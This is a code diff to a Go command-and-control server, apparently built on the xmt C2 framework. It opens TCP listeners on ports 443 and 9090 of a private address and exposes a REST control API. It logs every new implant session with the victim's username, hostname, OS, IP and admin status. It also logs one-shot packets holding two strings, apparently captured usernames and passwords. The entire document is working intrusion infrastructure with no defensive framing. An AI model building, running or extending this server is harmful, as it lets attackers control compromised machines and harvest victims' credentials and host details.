@@ -5,108 +5,88 @@ import (
 
 	"github.com/PurpleSec/logx"
 	"github.com/iDigitalFlame/xmt/c2"
-	"github.com/iDigitalFlame/xmt/c2/rpc"
+	"github.com/iDigitalFlame/xmt/c2/cfg"
+	"github.com/iDigitalFlame/xmt/c2/rest"
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/device"
 )
 
-var configTCP, configIP, configUDP []byte
+var logUser logx.Log
+
+var configTCP = []byte{}
 
 func main() {
-	f, err := logx.File("/tmp/thunderstorm.log", logx.Append, logx.Debug)
+	f, err := logx.File("/tmp/storm.log", logx.Append, logx.Debug)
 	if err != nil {
 		panic(err)
 	}
-	c2.Default.Log = logx.Multiple(f, logx.Console(logx.Debug))
+	if logUser, err = logx.File("/tmp/storm-extra.log", logx.Append, logx.Trace); err != nil {
+		panic(err)
+	}
+	c2.Default.SetLog(logx.Multiple(f, logx.Console(logx.Debug)))
+	c2.Default.New = newSession
+	c2.Default.Oneshot = newOneshot
 
-	if err := startTCPListener("tcp-alt", ""); err != nil {
+	if err := startTCPListener("tcp-alt", "172.16.10.184:9090"); err != nil {
 		panic("tcp-alt listen " + err.Error())
 	}
-	if err := startTCPListener("tcp", ""); err != nil {
+	if err := startTCPListener("tcp", "172.16.10.184:443"); err != nil {
 		panic("tcp listen " + err.Error())
 	}
-	if err := startUDPListener("dns", ""); err != nil {
-		panic("udp listen " + err.Error())
-	}
-	if err := startIPListener("ip", ""); err != nil {
-		panic("ip listen " + err.Error())
-	}
 
-	r := rpc.New(c2.Default)
-	go r.Listen("127.0.0.1:7777")
+	r := rest.New(c2.Default, "")
+	go r.Listen("127.0.0.1:7771")
 
 	c2.Default.Wait()
 	r.Close()
 	c2.Default.Close()
 }
-
 func newSession(s *c2.Session) {
-	var v string
-	for _, n := range s.Device.Network {
-		for _, a := range n.Address {
-			if a.IsZero() || a.IsLinkLocalUnicast() || a.IsLoopback() {
-				continue
-			}
-			v = a.String()
-			break
-		}
-	}
 	d := map[string]string{
 		"username":  s.Device.User,
 		"os":        s.Device.Version,
 		"hostname":  s.Device.Hostname,
-		"ipaddress": v,
+		"ipaddress": ip(s.Device),
 	}
 	if s.Device.Elevated {
 		d["username"] = "*" + d["username"]
 	}
 	b, _ := json.Marshal(d)
-	println(string(b))
+	logUser.Info(string(b))
+	logUser.Info(
+		"New Session: Host: %s (%s), User: %s (Admin=%t), OS: %s",
+		s.Device.Hostname, d["ipaddress"], s.Device.User, s.Device.Elevated, s.Device.Version,
+	)
 }
-func startIPListener(s, a string) error {
-	var c c2.Config
-	if err := c.ReadBytes(configIP); err != nil {
-		return err
+func newOneshot(n *com.Packet) {
+	var (
+		u, _ = n.StringVal()
+		p, _ = n.StringVal()
+		d    device.Machine
+	)
+	d.UnmarshalStream(n)
+	logUser.Warning(
+		"%q [%s] from %s (%s)", u, p, d.Hostname, ip(d),
+	)
+}
+func ip(d device.Machine) string {
+	for _, n := range d.Network {
+		for _, a := range n.Address {
+			if a.IsZero() || a.IsLinkLocalUnicast() || a.IsLoopback() {
+				continue
+			}
+			return a.String()
+		}
 	}
-	p, err := c.Profile()
-	if err != nil {
-		return err
-	}
-	l, err := c2.Default.Listen(s, a, com.NewIP(1, com.DefaultTimeout), p)
-	if err != nil {
-		return err
-	}
-	l.New = newSession
-	return nil
+	return ""
 }
 func startTCPListener(s, a string) error {
-	var c c2.Config
-	if err := c.ReadBytes(configTCP); err != nil {
-		return err
-	}
-	p, err := c.Profile()
+	p, err := cfg.Raw(configTCP)
 	if err != nil {
 		return err
 	}
-	l, err := c2.Default.Listen(s, a, com.TCP, p)
-	if err != nil {
+	if _, err = c2.Default.Listen(s, a, com.TCP, p); err != nil {
 		return err
 	}
-	l.New = newSession
-	return nil
-}
-func startUDPListener(s, a string) error {
-	var c c2.Config
-	if err := c.ReadBytes(configUDP); err != nil {
-		return err
-	}
-	p, err := c.Profile()
-	if err != nil {
-		return err
-	}
-	l, err := c2.Default.Listen(s, a, com.UDP, p)
-	if err != nil {
-		return err
-	}
-	l.New = newSession
 	return nil
 }
